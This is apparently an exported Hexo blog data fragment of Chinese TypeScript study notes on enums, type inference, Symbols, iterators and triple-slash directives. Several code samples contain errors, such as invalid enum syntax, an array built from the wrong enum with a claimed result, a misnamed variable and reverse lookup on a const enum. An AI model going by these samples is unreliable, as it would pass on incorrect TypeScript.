当一个表达式满足下面条件之一时，它就是一个常数枚举表达式：<ul>\n<li>数字字面量。</li>\n<li>引用之前定义的常数枚举成员（可以是在不同的枚举类型中定义的） 如果这个成员是在同一个枚举类型中定义的，可以使用非限定名来引用。</li>\n<li>带括号的常数枚举表达式。</li>\n<li><code>+</code>, <code>-</code>, <code>~</code> 一元运算符应用于常数枚举表达式。</li>\n<li><code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code>, <code>&lt;&lt;</code>, <code>&gt;&gt;</code>, <code>&gt;&gt;&gt;</code>, <code>&amp;</code>, <code>|</code>, <code>^</code>二元运算符，常数枚举表达式做为其一个操作对象。若常数枚举表达式求值后为 <code>NaN</code> 或 <code>Infinity</code>，则会在编译阶段报错。</li>\n</ul>\n</li>\n</ul>\n<p>除此之外所有其它的情况，枚举成员都是被当作需要计算得出的值。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">enum</span> FileAccess &#123;</span><br><span class=\"line\">    <span class=\"comment\">// constant members</span></span><br><span class=\"line\">    None,</span><br><span class=\"line\">    Read    = <span class=\"number\">1</span> &lt;&lt; <span class=\"number\">1</span>,</span><br><span class=\"line\">    Write   = <span class=\"number\">1</span> &lt;&lt; <span class=\"number\">2</span>,</span><br><span class=\"line\">    ReadWrite  = Read | Write,</span><br><span class=\"line\">    <span class=\"comment\">// computed member</span></span><br><span class=\"line\">    G = <span class=\"string\">\"123\"</span>.length</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>序列化成员</strong></p>\n<p>枚举成员的数值值，默认为从 <code>0</code> 开始的一组序数。改变其中的一个，会影响 <code>之后</code> 的数值序数，而不会对前面的造成影响。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 默认情况</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">enum</span> Order &#123;</span><br><span class=\"line\">    A,</span><br><span class=\"line\">    B,</span><br><span class=\"line\">    C,</span><br><span class=\"line\">    D</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> orders = [Order.A, Order.B, Order.C, Order.D]; <span class=\"comment\">// -&gt; [0,1,2,3]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 更改数值</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">enum</span> Order1 &#123;</span><br><span class=\"line\">    A,</span><br><span class=\"line\">    B = <span class=\"number\">3</span>,</span><br><span class=\"line\">    C,</span><br><span class=\"line\">    D</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> orders1 = [Order.A, Order.B, Order.C, Order.D]; <span class=\"comment\">// -&gt; [0,3,4,5]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 更改数值为负</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">enum</span> Order2 &#123;</span><br><span class=\"line\">    A,</span><br><span class=\"line\">    B = <span class=\"number\">-2</span>,</span><br><span class=\"line\">    C,</span><br><span class=\"line\">    D</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> orders2 = [Order.A, Order.B, Order.C, Order.D]; <span class=\"comment\">// -&gt; [0,-2,-1,0]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 无序数差值</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">enum</span> Order3 &#123;</span><br><span class=\"line\">    A,</span><br><span class=\"line\">    B = <span class=\"number\">1</span>,</span><br><span class=\"line\">    C,</span><br><span class=\"line\">    D = <span class=\"number\">2</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> orders2 = [Order.A, Order.B, Order.C, Order.D]; <span class=\"comment\">// -&gt; [0,1,2,2]</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"类型推论\"><a href=\"#类型推论\" class=\"headerlink\" title=\"类型推论\"></a>类型推论</h3><p><code>TypeScript</code> 里，在有些没有明确指出类型的地方，类型推论会帮助提供类型。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> num = <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// num 虽然没有指定为 number 类型，但是 typescript 会自动推断 num 的类型为 number</span></span><br><span class=\"line\"><span class=\"comment\">// let num: number = 1;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"最佳通用类型\"><a href=\"#最佳通用类型\" class=\"headerlink\" title=\"最佳通用类型\"></a>最佳通用类型</h4><p>当要从几个表达式中推断类型时，<code>typescript</code> 会为我们推断出一个最合适的通用类型。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"string\">'4'</span>,<span class=\"literal\">null</span>,<span class=\"literal\">undefined</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 还记得吗，null 和 undefined 是所有类型的 子类型</span></span><br><span class=\"line\"><span class=\"comment\">// arr 数组中含有 number 和 string 两种类型，则使用联合类型数组</span></span><br><span class=\"line\"><span class=\"comment\">// let arr: (number|string)[] = [1,2,3,'4',null,undefined]</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"上下文类型\"><a href=\"#上下文类型\" class=\"headerlink\" title=\"上下文类型\"></a>上下文类型</h4><p><code>TypeScript</code> 类型推论也可能按照相反的方向进行，这被叫做“按上下文归类”。按上下文归类会发生在表达式的类型与所处的位置相关时。</p>\n<p>这里直接引用官方例子：<br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">window</span>.onmousedown = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">mouseEvent</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(mouseEvent.button);  <span class=\"comment\">//-&gt; Error</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// TypeScript 类型检查器使用 Window.onmousedown函数 的类型来 推断 右边函数表达式的参数类型</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 通过手动指定的方式，避免类型推断</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">window</span>.onmousedown = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">mouseEvent: <span class=\"built_in\">any</span></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(mouseEvent.button); <span class=\"comment\">// -&gt; success</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"<p>本文介绍枚举(<code>enum</code>)及类型推论。<br>","more":"</p>\n<h3 id=\"枚举\"><a href=\"#枚举\" class=\"headerlink\" title=\"枚举\"></a>枚举</h3><p>使用枚举我们可以定义一些有名字的数字常量。 枚举通过 enum关键字来定义。<br><code>typescript</code> 中的枚举可以理解为是 <code>javascript</code> 中的一种特殊的对象——<strong>键为变量名，值为连续的序数</strong>。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// javascript</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> enumOfJS = &#123;</span><br><span class=\"line\">    one: <span class=\"number\">0</span>,</span><br><span class=\"line\">    two: <span class=\"number\">1</span>,</span><br><span class=\"line\">    three: <span class=\"number\">2</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(enumOfJS.one); <span class=\"comment\">// -&gt; 0</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(enumOfJS.two); <span class=\"comment\">// -&gt; 1</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(enumOfJS.three); <span class=\"comment\">// -&gt; 2</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// typescript</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">enum</span> enumOfTS = &#123;</span><br><span class=\"line\">    one,</span><br><span class=\"line\">    two,</span><br><span class=\"line\">    three</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(enumOfTS.one); <span class=\"comment\">// -&gt; 0</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(enumOfTS.two); <span class=\"comment\">// -&gt; 1</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(enumOfTS.three); <span class=\"comment\">// -&gt; 2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 反向枚举</span></span><br><span class=\"line\"><span class=\"comment\">// 在 javascript 并没有这种功能，需要自己遍历</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(enumOfTS[<span class=\"number\">0</span>]); <span class=\"comment\">// -&gt; one</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(enumOfTS[<span class=\"number\">1</span>]); <span class=\"comment\">// -&gt; two</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(enumOfTS[<span class=\"number\">2</span>]); <span class=\"comment\">// -&gt; three</span></span><br></pre></td></tr></table></figure>\n<p><strong>枚举成员</strong></p>\n<p>枚举成员具有一个数字值，它可以是 <code>常数</code> 或是 <code>计算得出的值</code>;<br>当满足如下条件时，枚举成员被当作是常数：</p>\n<ul>\n<li>不具有初始化函数并且之前的枚举成员是常数。 在这种情况下，当前枚举成员的值为上一个枚举成员的值加1。 但第一个枚举元素是个例外。如果它没有初始化方法，那么它的初始值为 <code>0</code>。</li>\n<li>枚举成员使用常数枚举表达式初始化。 常数枚举表达式是TypeScript表达式的子集，它可以在编译阶段求值。 当一个表达式满足下面条件之一时，它就是一个常数枚举表达式：<ul>\n<li>数字字面量。</li>\n<li>引用之前定义的常数枚举成员（可以是在不同的枚举类型中定义的） 如果这个成员是在同一个枚举类型中定义的，可以使用非限定名来引用。</li>\n<li>带括号的常数枚举表达式。</li>\n<li><code>+</code>, <code>-</code>, <code>~</code> 一元运算符应用于常数枚举表达式。</li>\n<li><code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code>, <code>&lt;&lt;</code>, <code>&gt;&gt;</code>, <code>&gt;&gt;&gt;</code>, <code>&amp;</code>, <code>|</code>, <code>^</code>二元运算符，常数枚举表达式做为其一个操作对象。若常数枚举表达式求值后为 <code>NaN</code> 或 <code>Infinity</code>，则会在编译阶段报错。</li>\n</ul>\n</li>\n</ul>\n<p>除此之外所有其它的情况，枚举成员都是被当作需要计算得出的值。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">enum</span> FileAccess &#123;</span><br><span class=\"line\">    <span class=\"comment\">// constant members</span></span><br><span class=\"line\">    None,</span><br><span class=\"line\">    Read    = <span class=\"number\">1</span> &lt;&lt; <span class=\"number\">1</span>,</span><br><span class=\"line\">    Write   = <span class=\"number\">1</span> &lt;&lt; <span class=\"number\">2</span>,</span><br><span class=\"line\">    ReadWrite  = Read | Write,</span><br><span class=\"line\">    <span class=\"comment\">// computed member</span></span><br><span class=\"line\">    G = <span class=\"string\">\"123\"</span>.length</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>序列化成员</strong></p>\n<p>枚举成员的数值值，默认为从 <code>0</code> 开始的一组序数。改变其中的一个，会影响 <code>之后</code> 的数值序数，而不会对前面的造成影响。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 默认情况</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">enum</span> Order &#123;</span><br><span class=\"line\">    A,</span><br><span class=\"line\">    B,</span><br><span class=\"line\">    C,</span><br><span class=\"line\">    D</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> orders = [Order.A, Order.B, Order.C, Order.D]; <span class=\"comment\">// -&gt; [0,1,2,3]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 更改数值</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">enum</span> Order1 &#123;</span><br><span class=\"line\">    A,</span><br><span class=\"line\">    B = <span class=\"number\">3</span>,</span><br><span class=\"line\">    C,</span><br><span class=\"line\">    D</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> orders1 = [Order.A, Order.B, Order.C, Order.D]; <span class=\"comment\">// -&gt; [0,3,4,5]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 更改数值为负</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">enum</span> Order2 &#123;</span><br><span class=\"line\">    A,</span><br><span class=\"line\">    B = <span class=\"number\">-2</span>,</span><br><span class=\"line\">    C,</span><br><span class=\"line\">    D</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> orders2 = [Order.A, Order.B, Order.C, Order.D]; <span class=\"comment\">// -&gt; [0,-2,-1,0]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 无序数差值</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">enum</span> Order3 &#123;</span><br><span class=\"line\">    A,</span><br><span class=\"line\">    B = <span class=\"number\">1</span>,</span><br><span class=\"line\">    C,</span><br><span class=\"line\">    D = <span class=\"number\">2</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> orders2 = [Order.A, Order.B, Order.C, Order.D]; <span class=\"comment\">// -&gt; [0,1,2,2]</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"类型推论\"><a href=\"#类型推论\" class=\"headerlink\" title=\"类型推论\"></a>类型推论</h3><p><code>TypeScript</code> 里，在有些没有明确指出类型的地方，类型推论会帮助提供类型。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> num = <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// num 虽然没有指定为 number 类型，但是 typescript 会自动推断 num 的类型为 number</span></span><br><span class=\"line\"><span class=\"comment\">// let num: number = 1;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"最佳通用类型\"><a href=\"#最佳通用类型\" class=\"headerlink\" title=\"最佳通用类型\"></a>最佳通用类型</h4><p>当要从几个表达式中推断类型时，<code>typescript</code> 会为我们推断出一个最合适的通用类型。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"string\">'4'</span>,<span class=\"literal\">null</span>,<span class=\"literal\">undefined</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 还记得吗，null 和 undefined 是所有类型的 子类型</span></span><br><span class=\"line\"><span class=\"comment\">// arr 数组中含有 number 和 string 两种类型，则使用联合类型数组</span></span><br><span class=\"line\"><span class=\"comment\">// let arr: (number|string)[] = [1,2,3,'4',null,undefined]</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"上下文类型\"><a href=\"#上下文类型\" class=\"headerlink\" title=\"上下文类型\"></a>上下文类型</h4><p><code>TypeScript</code> 类型推论也可能按照相反的方向进行，这被叫做“按上下文归类”。按上下文归类会发生在表达式的类型与所处的位置相关时。</p>\n<p>这里直接引用官方例子：<br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">window</span>.onmousedown = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">mouseEvent</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(mouseEvent.button);  <span class=\"comment\">//-&gt; Error</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// TypeScript 类型检查器使用 Window.onmousedown函数 的类型来 推断 右边函数表达式的参数类型</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 通过手动指定的方式，避免类型推断</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">window</span>.onmousedown = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">mouseEvent: <span class=\"built_in\">any</span></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(mouseEvent.button); <span class=\"comment\">// -&gt; success</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>"},{"title":"Typescript学习日记(十)","date":"2017-03-17T06:20:02.000Z","_content":"\n`symbol` 是 `ECMAScript 2015` 提出的一种行的原生类型，就像 `number` 和 `string` 一样。实现了 `Symbol.iterator` 方法就可以使用 `for-of` 遍历。\n<!-- more -->\n\n### Symbols\n\n#### 创建\n\n```js\n// 注意，Symbol() 并不是一个构造函数，所以不需要 new 关键字\nlet sy = Symbol('key');\n```\n\n\n#### Symbols是不可改变且唯一的\n```js\nlet sy1 = Symbol('a');\nlet sy2 = Symbol('a');\n\nsy1 === sy2;  // -> false\n```\n\n#### 像字符串一样，symbols也可以被用做对象属性的键\n\n```js\nlet sy = Symbol('key');\n\nlet obj = {\n    [sy]: \"value\"\n};\n\nconsole.log(obj[sym]); // \"value\"\n```\n\n#### Symbols也可以与计算出的 `属性名声明相结合` 来 `声明对象的属性和类成员`\n\n```js\nconst getClassNameSymbol = Symbol();\n\nclass C {\n    [getClassNameSymbol](){\n       return \"C\";\n    }\n}\n\nlet c = new C();\nlet className = c[getClassNameSymbol](); // \"C\"\n```\n\n#### 内置属性\n\n**`Symbol.hasInstance`**\n方法，会被 `instanceof` 运算符调用。构造器对象用来识别一个对象是否是其实例。\n\n**`Symbol.isConcatSpreadable`**\n布尔值，表示当在一个对象上调用 `Array.prototype.concat` 时，这个对象的数组元素是否可展开。\n\n**`Symbol.iterator`**\n方法，被for-of语句调用。返回对象的默认迭代器。\n\n**`Symbol.match`**\n方法，被 `String.prototype.match` 调用。正则表达式用来匹配字符串。\n\n**`Symbol.replace`**\n方法，被 `String.prototype.replace` 调用。正则表达式用来替换字符串中匹配的子串。\n\n**`Symbol.search`**\n方法，被 `String.prototype.search` 调用。正则表达式返回被匹配部分在字符串中的索引。\n\n**`Symbol.species`**\n函数值，为一个构造函数。用来创建派生对象。\n\n**`Symbol.split`**\n方法，被 `String.prototype.split` 调用。正则表达式来用分割字符串。\n\n**`Symbol.toPrimitive`**\n方法，被 `ToPrimitive` 抽象操作调用。把对象转换为相应的原始值。\n\n**`Symbol.toStringTag`**\n方法，被内置方法 `Object.prototype.toString` 调用。返回创建对象时默认的字符串描述。\n\n**`Symbol.unscopables`**\n对象，它自己拥有的属性会被 `with` 作用域排除在外。\n\n更多关于 `Symbols` 的介绍可以查看[这里](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol)。\n\n### 迭代器(iterator)和生成器\n\n当一个对象实现了 `Symbol.iterator` 属性时，我们认为它是可迭代的。目前一些内置的类型如 `Array`，`Map`，`Set`，`String`，`Int32Array`，`Uint32Array` 等都已经实现了各自的 `Symbol.iterator`。 对象上的 `Symbol.iterator` 函数负责返回供迭代的值。\n\n\n#### `for-of` 语句\n\n`for-of` 会遍历可迭代的对象，调用对象上的 `Symbol.iterator` 方法。\n\n```js\nlet arr = [1, \"string\", false];\n\nfor (let val of arr) {\n    console.log(val); // 1, \"string\", false\n}\n```\n\n#### `for-of` vs `for-in`\n\n`for-of` 和 `for-in` 均可迭代一个列表；但是用于迭代的值却不同，`for-in` 迭代的是对象的 `键` 的列表，而`for-of` 则迭代对象的键对应的值。\n\n```js\nlet arr = [1, \"string\", false];\n\nfor(let key in arr) {\n    console.log(key); // 0, 1, 2\n}\n\nfor (let val of arr) {\n    console.log(val); // 1, \"string\", false\n}\n```\n\n另一个区别是 `for-in` 可以操作任何对象；它提供了查看对象属性的一种方法。 但是 `for-of` 关注于迭代对象的值。内置对象 `Map` 和 `Set` 已经实现了 `Symbol.iterator` 方法，让我们可以访问它们保存的值。\n\n```js\nlet pets = new Set([\"Cat\", \"Dog\", \"Hamster\"]);\npets[\"species\"] = \"mammals\";\n\nfor (let pet in pets) {\n    console.log(pet); // \"species\"\n}\n\nfor (let pet of pets) {\n    console.log(pet); // \"Cat\", \"Dog\", \"Hamster\"\n}\n```\n\n\n### 三斜线指令\n\n三斜线指令是包含单个XML标签的单行注释。 注释的内容会做为编译器指令使用。\n\n三斜线指令仅可放在包含它的文件的最顶端。 一个三斜线指令的前面只能出现单行或多行注释，这包括其它的三斜线指令。 如果它们出现在 `一个语句或声明` 之后，那么它们会被当做普通的单行注释，并且不具有特殊的涵义。\n\n#### `/// <reference path=\"...\" />`\n\n`/// <reference path=\"...\" />` 指令是三斜线指令中最常见的一种。 它用于声明文件间的 `依赖`。三斜线引用告诉编译器在编译过程中要引入的额外的文件。\n\n#### 使用 `--noResolve`\n如果指定了 `--noResolve` 编译选项，三斜线引用会被忽略；它们不会增加新文件，也不会改变给定文件的顺序。\n\n#### `/// <reference types=\"...\" />`\n与 `/// <reference path=\"...\" />` 指令相似，这个指令是用来声明依赖的； 一个 `/// <reference path=\"...\" />` 指令声明了对 `@types` 包的一个依赖。\n\n在声明文件里包含 `/// <reference types=\"node\" />`，表明这个文件使用了 `@types/node/index.d.ts` 里面声明的名字； 并且，这个包要在编译阶段与声明文件一起被包含进来。\n\n解析 `@types` 包的名字的过程与解析 `import` 语句里模块名的过程类似。 所以可以简单的把三斜线类型引用指令想像成针对包的 `import` 声明。\n\n仅当在你需要写一个 `d.ts` 文件时才使用这个指令。\n\n对于那些在编译阶段生成的声明文件，编译器会自动地添加 `/// <reference types=\"...\" />`； 当且仅当结果文件中使用了引用的@types包里的声明时才会在生成的声明文件里添加 `/// <reference types=\"...\" />` 语句。\n\n\n### 总结\n\n大致看了下，后面的内容都是一些需要记忆的内容，不会牵扯到太多的代码；这里就不再继续往下写了，有想阅读后面内容的朋友可以进入[Typescript中文文档](https://www.tslang.cn/index.html)继续学习。\n\n\n\n\n","source":"_posts/Typescript学习日记（十）.md","raw":"---\ntitle: Typescript学习日记(十)\ndate: 2017-03-17 14:20:02\ntags:\n---\n\n`symbol` 是 `ECMAScript 2015` 提出的一种行的原生类型，就像 `number` 和 `string` 一样。实现了 `Symbol.iterator` 方法就可以使用 `for-of` 遍历。\n<!-- more -->\n\n### Symbols\n\n#### 创建\n\n```js\n// 注意，Symbol() 并不是一个构造函数，所以不需要 new 关键字\nlet sy = Symbol('key');\n```\n\n\n#### Symbols是不可改变且唯一的\n```js\nlet sy1 = Symbol('a');\nlet sy2 = Symbol('a');\n\nsy1 === sy2;  // -> false\n```\n\n#### 像字符串一样，symbols也可以被用做对象属性的键\n\n```js\nlet sy = Symbol('key');\n\nlet obj = {\n    [sy]: \"value\"\n};\n\nconsole.log(obj[sym]); // \"value\"\n```\n\n#### Symbols也可以与计算出的 `属性名声明相结合` 来 `声明对象的属性和类成员`\n\n```js\nconst getClassNameSymbol = Symbol();\n\nclass C {\n    [getClassNameSymbol](){\n       return \"C\";\n    }\n}\n\nlet c = new C();\nlet className = c[getClassNameSymbol](); // \"C\"\n```\n\n#### 内置属性\n\n**`Symbol.hasInstance`**\n方法，会被 `instanceof` 运算符调用。构造器对象用来识别一个对象是否是其实例。\n\n**`Symbol.isConcatSpreadable`**\n布尔值，表示当在一个对象上调用 `Array.prototype.concat` 时，这个对象的数组元素是否可展开。\n\n**`Symbol.iterator`**\n方法，被for-of语句调用。返回对象的默认迭代器。\n\n**`Symbol.match`**\n方法，被 `String.prototype.match` 调用。正则表达式用来匹配字符串。\n\n**`Symbol.replace`**\n方法，被 `String.prototype.replace` 调用。正则表达式用来替换字符串中匹配的子串。\n\n**`Symbol.search`**\n方法，被 `String.prototype.search` 调用。正则表达式返回被匹配部分在字符串中的索引。\n\n**`Symbol.species`**\n函数值，为一个构造函数。用来创建派生对象。\n\n**`Symbol.split`**\n方法，被 `String.prototype.split` 调用。正则表达式来用分割字符串。\n\n**`Symbol.toPrimitive`**\n方法，被 `ToPrimitive` 